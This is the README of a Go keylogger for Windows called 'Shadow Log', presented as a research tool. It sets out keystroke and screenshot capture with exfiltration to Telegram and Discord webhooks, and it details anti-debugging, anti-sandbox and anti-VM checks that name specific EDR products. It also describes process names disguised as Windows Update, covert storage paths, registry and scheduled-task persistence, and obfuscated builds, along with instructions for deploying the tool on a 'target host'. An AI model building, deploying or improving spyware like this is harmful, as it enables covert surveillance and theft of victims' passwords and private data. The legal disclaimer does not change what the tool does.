# Shadow Log: Discrete Activity Analytics

![Go](https://img.shields.io/badge/Language-Go-00ADD8?style=for-the-badge&logo=go&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Build](https://img.shields.io/badge/Build-Hardened-success?style=for-the-badge)

**Official Website**: [shadowlog.iambgx.in](https://shadowlog.iambgx.in)

Shadow Log is a high-performance, native systems monitoring framework engineered for advanced cybersecurity research and authorized security demonstrations. Built entirely in Go with zero runtime dependencies, it provides an enterprise-grade approach to discrete activity capture, low-resource processing, and dual-channel exfiltration — hardened against reverse engineering, sandbox analysis, and endpoint detection systems.

---

> [!CAUTION]
> ### Legal and Ethical Warning
> **FOR AUTHORIZED EDUCATIONAL AND RESEARCH USE ONLY.**
> Unauthorized deployment of monitoring tools on systems you do not own or have explicit, documented permission to monitor is illegal and a violation of privacy laws (such as the Computer Fraud and Abuse Act). This software is provided "as-is" for security professionals and students to study low-level system hooks and secure exfiltration techniques. The developer assumes no liability for misuse, data loss, or legal consequences resulting from the use of this tool. By using this software, you agree to our official [Terms of Service](https://shadowlog.iambgx.in/terms) and [Privacy Policy](https://shadowlog.iambgx.in/privacy).

---

## Technical Features

### 🛡️ Multi-Layer Anti-Analysis

Shadow Log employs a defense-in-depth approach to remain undetectable:

| Layer | Technique | What It Defeats |
|-------|-----------|-----------------|
| **Anti-Debug** | `IsDebuggerPresent`, `NtQueryInformationProcess` (debug port + flags), `GetTickCount64` timing gate | x64dbg, OllyDbg, WinDbg, kernel debuggers, single-stepping |
| **Anti-Sandbox** | RAM, CPU, screen resolution, mouse movement, disk size, and uptime checks | AV sandbox environments (Windows Defender, CrowdStrike, SentinelOne) |
| **Anti-VM** | VMware/VirtualBox/QEMU/Xen driver and registry artifact detection | Virtualized analysis environments |
| **Anti-RE** | Debugger window class detection, suspicious neighbor executable scanning | IDA Pro, Ghidra, Wireshark, Fiddler, ProcMon |
| **Build** | Symbol stripping (`-s -w`), path removal (`-trimpath`), build ID erasure, optional garble obfuscation | Static binary analysis, `strings.exe` extraction |

### 🔒 Stealth & OPSEC

- **Camouflaged Identity**: Process, registry, scheduled task, and mutex names mimic legitimate Windows Update components — invisible to process monitors and endpoint detection tools.
- **Covert Storage**: Encrypted data stored in `%LOCALAPPDATA%\Microsoft\Windows\WebCache\` — a real Windows directory, blending with legitimate browser cache files.
- **Network Stealth**: Randomized 60–180 second startup delay before first network connection, plus 2–8 second jitter between sync calls — defeats behavioral network scanners.
- **Zero-Dependency Architecture**: Runs natively without requiring external runtimes.

### 🌐 Universal Precision Capture

- **International Keyboard Support**: Leverages the Windows `ToUnicode` API for 100% accuracy across all regions, correctly capturing symbols, accents, and shifted characters.
- **Context-Aware Metadata**: Every event is correlated with the foreground `ProcessID`, application name, and active window title.
- **Active Window Handle Caching**: Only queries process metadata when the foreground window changes — negligible CPU overhead.

### 🔐 Secure Exfiltration

- **Dual-Channel Delivery**: Simultaneously sends telemetry to both Telegram and Discord without intermediary bots.
- **Password-Bound Local Encryption**: Local backups encrypted with **AES-256-GCM**. The encryption key is derived from a user-defined password, with the salt computed at runtime (never stored as a static string in the binary).

### 📸 Dynamic Surveillance Capture

- **Context-Triggered Snapshots**: Automatically captures the active window when sensitive keywords are detected in the window title.
- **Interactive Triggers**: Real-time capture on mouse clicks and window focus changes.
- **RAM-Only Processing**: Encodes JPEGs directly in memory — zero disk I/O traces.
- **Active Window Bracketing**: Crops captures to the foreground window only (<200KB per event).

---

## 🚀 Setup & Deployment Guide

### Option 1: Quick Start (Security Analysts)

Download the latest **`ShadowLog_Release.zip`** from the [Releases](https://github.com/BGx-11/ShadowLog/releases) page.

#### Phase 1: Installation
1. **Extract** the archive on the target host.
2. **Run** the core executable as Administrator to start the setup wizard.
   - *Note: If run without Administrator privileges, the tool will trigger a native Windows MessageBox warning and terminate immediately to prevent silent hooking failures.*
   - *A terminal window may flash briefly while hooks are successfully registered.*

#### Phase 2: Configuration
During setup, you'll configure:

- **Encryption Password (Required)**: Securely locks local forensic backups.

- **Discord Webhook (Optional but Recommended)**:
  1. Create a private channel (e.g., `#shadow-logs`) in your Discord server.
  2. Go to **Edit Channel** → **Integrations** → **Webhooks** → **New Webhook**.
  3. Copy the webhook URL and paste it into the setup wizard.

- **Telegram Details (Optional)**:
  1. Message `@BotFather` → `/newbot` → follow prompts → copy the **Bot Token**.
  2. Create a private group, invite your bot, send `/test` in the group.
  3. Visit `https://api.telegram.org/bot<TOKEN>/getUpdates` and copy the **Chat ID** (negative number).

#### Phase 3: Deployment
1. Click **Test Configuration** to verify.
2. Click **Initialize Monitor** — the service locks configuration and runs silently.

---

### Option 2: Build from Source (Developers)

#### Prerequisites
- **Go 1.21+** (1.26+ recommended for garble obfuscation)
- **Windows 10/11**
- **garble** (optional): `go install mvdan.cc/garble@latest`

#### Compilation

Run the included build script:

```powershell
.\build.bat
```

Or build manually:

```powershell
# Core Monitor
go build -trimpath -ldflags "-H windowsgui -s -w -buildid=" -o WinUpdateSvc.exe main.go

# Forensic Decryptor
go build -trimpath -ldflags "-H windowsgui -s -w -buildid=" -o Decryptor.exe decryptor/main.go

# System Uninstaller
go build -trimpath -ldflags "-H windowsgui -s -w -buildid=" -o Uninstaller.exe uninstaller/main.go
```

The build script auto-detects garble and uses it for maximum obfuscation when available.

---

## 🔍 Forensic Reconstruction

1. **Launch** `Decryptor.exe` on the host machine.
2. The decryptor opens a premium web dashboard at `http://localhost:58292`.
3. Enter your **Encryption Password** to reconstruct encrypted logs.
4. **Analyze & Export**:
   - Live filtering by window title or keystroke content.
   - Visual artifact correlation for screenshot events.
   - JSON export for external forensic tools.

---

## 🧹 System Decommission

Run `Uninstaller.exe` to:
- Terminate all active monitor processes (current and legacy names).
- Remove registry Run key entries (all versions).
- Delete scheduled tasks (all versions).
- Purge encrypted telemetry from disk.

---

## Project Structure

```
shadowlog/
├── main.go                 # Entry point — anti-analysis, setup, logger init
├── build.bat               # Hardened build script with garble support
├── config/
│   ├── config.go           # AES-256-GCM encrypted config management
│   ├── paths.go            # Covert storage paths
│   └── machine.go          # Machine-specific key derivation
├── monitor/
│   └── monitor.go          # Keyboard/mouse hooks, screenshot, exfiltration
├── persistence/
│   └── persistence.go      # Registry + scheduled task persistence
├── ui/
│   └── ui.go               # Setup wizard (web-based)
├── decryptor/
│   └── main.go             # Forensic log decryption dashboard
├── uninstaller/
│   └── main.go             # Complete system removal tool
└── site/                   # Landing page (Next.js)
```

---

<div align="center">

**Devansh Agarwal (BGx)**  
*Cyber Sec Student & Student Developer*  
[Portfolio](https://iambgx.in)

</div>
